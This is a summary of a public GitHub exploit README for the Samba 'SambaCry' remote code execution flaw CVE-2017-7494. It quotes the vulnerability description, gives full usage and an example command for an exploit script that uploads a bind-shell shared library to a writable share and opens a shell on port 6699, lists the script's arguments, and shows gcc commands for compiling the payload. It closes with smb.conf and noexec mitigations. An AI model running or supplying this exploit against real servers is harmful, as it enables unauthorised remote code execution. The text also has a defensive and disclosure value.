# CVE-2017-7494 SambaCry — GitHub opsxcq Exploit README / Technical Analysis

**Source URL:** https://github.com/opsxcq/exploit-CVE-2017-7494/blob/master/README.md
**CVE:** CVE-2017-7494
**Fetched:** 2026-05-18
**Source type:** blog

---

## Vulnerability Description

"Samba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4 does not restrict the file path when using Windows named pipes, which allows remote authenticated users to upload a shared library to a writable shared folder, and execute arbitrary code via a crafted named pipe."

The vulnerability enables remote code execution through uploading malicious shared libraries to writable network shares and executing them through named pipes.

## Exploitation Method

The provided exploit requires:
- Patched impacket Python library
- Dependencies listed in requirements.txt
- Python 2.7 (or Python 3 with virtual environment)

**Basic command structure:**
```
./exploit.py -t <target> -e libbindshell-samba.so \
             -s <share> -r <location>/libbindshell-samba.so \
             -u <user> -p <password> -P 6699
```

**Example execution:**
```
./exploit.py -t localhost -e libbindshell-samba.so \
             -s data -r /data/libbindshell-samba.so \
             -u sambacry -p nosambanocry -P 6699
```

## Exploit Arguments

- `-t/--target`: Remote host address
- `-e/--executable`: Local path to malicious library
- `-s/--remoteshare`: Target share name
- `-r/--remotepath`: Remote library location
- `-u/--user`: Authentication username
- `-p/--password`: Authentication password
- `-P/--remoteshellport`: Port for bind shell connection

## Payload Development

Attackers can modify `bindshell-samba.c` and compile:
```
gcc -c -fpic bindshell-samba.c
gcc -shared -o libbindshell-samba.so bindshell-samba.o
```

## Mitigation

Add to smb.conf `[global]` section: `nt pipe support = no`

Also mount writable shares with `noexec` option.
